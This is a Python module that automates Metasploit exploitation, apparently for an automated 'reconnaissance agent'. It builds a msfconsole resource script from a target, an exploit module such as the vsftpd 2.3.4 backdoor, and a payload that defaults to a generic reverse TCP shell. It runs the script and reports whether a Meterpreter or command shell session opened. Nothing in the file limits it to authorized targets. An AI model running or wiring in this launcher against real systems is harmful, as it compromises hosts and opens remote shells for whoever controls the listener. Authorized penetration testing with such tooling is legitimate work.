"""
Metasploit automation module for the reconnaissance agent using msfconsole CLI.
"""

import subprocess
import logging
from typing import Dict, Any, Optional
from datetime import datetime
import tempfile
import os
import re

class MetasploitExploit:
    """Automates Metasploit scans and exploitation using msfconsole CLI."""

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def scan_and_exploit(self, target: str, exploit_module: str, payload: str = "generic/shell_reverse_tcp", **kwargs) -> Dict[str, Any]:
        """
        Run an exploit using Metasploit against a target.

        Args:
            target: Target IP address or domain.
            exploit_module: Metasploit module to use (e.g., exploit/unix/ftp/vsftpd_234_backdoor).
            payload: Payload to use with the exploit (default: generic reverse shell).
            **kwargs: Optional parameters (e.g., RPORT, LHOST, LPORT)

        Returns:
            Dictionary containing status, output, and metadata.
        """
        try:
            self.logger.info(f"Starting Metasploit exploit: {exploit_module} -> {target}")
            lhost = kwargs.get("LHOST", "127.0.0.1")
            lport = kwargs.get("LPORT", "4444")
            rport = kwargs.get("RPORT", "21")

            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.rc') as rc_script:
                rc_script.write(f"use {exploit_module}\n")
                rc_script.write(f"set RHOSTS {target}\n")
                rc_script.write(f"set RPORT {rport}\n")
                rc_script.write(f"set PAYLOAD {payload}\n")
                rc_script.write(f"set LHOST {lhost}\n")
                rc_script.write(f"set LPORT {lport}\n")
                rc_script.write("exploit -z\n")  # -z keeps the session open
                rc_script.write("exit\n")
                rc_path = rc_script.name

            process = subprocess.run(
                ["msfconsole", "-q", "-r", rc_path],
                capture_output=True,
                text=True,
                timeout=kwargs.get("timeout", 60)
            )

            os.remove(rc_path)  # Clean up script file

            if process.returncode != 0:
                raise Exception(f"Metasploit failed: {process.stderr}")

            result = {
                "target": target,
                "status": "success",
                "exploit_used": exploit_module,
                "payload_used": payload,
                "scan_date": datetime.utcnow().isoformat(),
                "raw_output": process.stdout,
                "key_findings": self._extract_findings(process.stdout)
            }

            return result

        except subprocess.TimeoutExpired:
            self.logger.error(f"Metasploit scan timed out for {target}")
            return {
                "status": "error",
                "target": target,
                "error": "Metasploit timed out",
                "raw_output": ""
            }
        except Exception as e:
            self.logger.error(f"Metasploit error: {str(e)}")
            return {
                "status": "error",
                "target": target,
                "error": str(e),
                "raw_output": ""
            }

    def _extract_findings(self, output: str) -> list:
        """Extract meaningful events or session info from raw Metasploit output."""
        findings = []

        # Look for session creation
        if "Meterpreter session" in output or "Command shell session" in output:
            findings.append("Session opened - exploitation successful")

        # Look for typical failure messages
        if "Exploit completed, but no session was created" in output:
            findings.append("Exploit sent but no session created")

        # Common error patterns
        if re.search(r'failed|error|unable', output, re.IGNORECASE):
            findings.append("Potential failure or misconfiguration detected")

        return findings
